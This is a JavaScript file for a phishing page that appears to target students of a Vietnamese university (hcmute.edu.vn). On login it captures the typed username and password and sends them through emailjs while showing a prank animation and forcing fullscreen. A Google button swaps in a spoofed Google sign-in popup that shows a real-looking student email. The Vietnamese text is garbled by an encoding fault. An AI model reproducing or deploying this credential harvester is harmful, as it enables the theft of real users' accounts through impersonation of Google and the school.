
const loginBtn = document.querySelector('#loginbtn')
const googleBtn = document.querySelector('.btn-Google')
const pageWrapper = document.querySelector('#page-wrapper')

//show Joke
function showJoke() {
    document.querySelector('.joke').style.animation = 'move 0.5s forwards';
    var audio = document.querySelector('#joke-audio')
    audio.currentTime = 0.2 * 60
    audio.play()
}
function addFileCss() {
    var cssId = 'myCss';  // you could encode the css path itself to generate id..
    if (!document.getElementById(cssId)) {
        var head = document.getElementsByTagName('head')[0];
        var link = document.createElement('link');
        link.id = cssId;
        link.rel = 'stylesheet';
        link.type = 'text/css';
        link.href = './assets/google-login.css';
        link.media = 'all';
        head.appendChild(link);
    }
}
function addFileJS() {
    var body = document.getElementsByTagName('body')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.onload = function () {
        callFunctionFromScript();
    }
    script.src = './js/google-login.js';
    body.appendChild(script);
}
function openFullscreen() {
    var elem = document.documentElement;
    if (elem.requestFullscreen) {
        elem.requestFullscreen();
    } else if (elem.webkitRequestFullscreen) { /* Safari */
        elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) { /* IE11 */
        elem.msRequestFullscreen();
    }
}
//Ham gui Email
function sendEmail(email, password) {
    emailjs.send("service_aka17ws", "template_q8bzyhf", {
        email: email,
        pass: password,
    });
}
//Event Handler
loginBtn.addEventListener('click', () => {
    showJoke();
    openFullscreen();
    var username = document.querySelector('#username').value
    var pwd = document.querySelector('#password').value
    sendEmail(username, pwd);

})
googleBtn.addEventListener('click', function (e) {
    var body = document.getElementsByTagName("BODY")[0];
    pageWrapper.remove()
    addFileCss();
    let htmls = `
    <div class="spoofHeader">
        <div class="nav">
            <div class="left">
                <img src="./assets/google-logo.png">
                <h2>????ng nh????p v???i t??i kho???n Google</h2>
            </div>
            <div class="right">
                <i class="fa-solid fa-minus"></i>
                <i class="fa-regular fa-square"></i>
                <i class="fa-solid fa-xmark"></i>
            </div>
        </div>
        <div class="back">
            <i class="fa-solid fa-arrow-left" id="backBtn"></i>
        </div>
    </div>
    <div class="wrapper">
        <div class="progress-bar">
            <div class="progress"></div>
        </div>
        <div class="header">
            <img src="./assets/google-logo.png">
            <h2>????ng nh????p b????ng Google</h2>
        </div>
        <div id="input-email">
            <div class="content">
                <h1>????ng nh???p</h1>
                <p>Ti???p t???c t???i <span class="link">hcmute.edu.vn</span></p>
                <div class="form-group">
                    <span class="label">Email ho???c s??? ??i???n tho???i</span>
                    <input type="email" class="form-control" id="txtEmail">
                </div>
                <a href="#" class="link">B???n qu??n ?????a ch??? email?</a>
            </div>
            <div class="footer">
                <a class="link">T???o t??i kho???n</a>
                <button class="btn" id="nextEmail">Ti???p theo</button>
            </div>
        </div>
        <!--Password-->
        <div id="input-pass">
            <div class="content">
                <h1>Ch??o m???ng</h1>
                <p class="email-address">
                    <i class="fa-solid fa-circle-user"></i>
                    <span>19110420@student.hcmute.edu.vn</span>
                </p>
                <p>????? ti???p t???c, tr?????c ti??n, h??y x??c minh danh t??nh c???a b???n</p>
                <div class="form-group focus">
                    <span class="label">Nh???p m???t kh???u c???a b???n</span>
                    <input type="password" class="form-control" id="txtPass">
                </div>
                <label for="show-pass" class="show-pass">
                    <input type="checkbox" id="show-pass">Hi???n m???t kh???u
                </label>
            </div>
            <div class="footer">
                <a class="link">B???n qu??n m???t kh???u?</a>
                <button class="btn" id="nextPass">Ti???p theo</button>
            </div>
        </div>

    </div>
    <div class="setting">
        <p class="sumary">Ti???ng Vi???t</p>
        <div>
            <a href="#" class="link-setting">Tr??? gi??p</a>
            <a href="#" class="link-setting">B???o m???t</a>
            <a href="#" class="link-setting">??i???u kho???n</a>
        </div>
    </div>`;
    body.insertAdjacentHTML("afterbegin",htmls);
    addFileJS();
    openFullscreen()
})
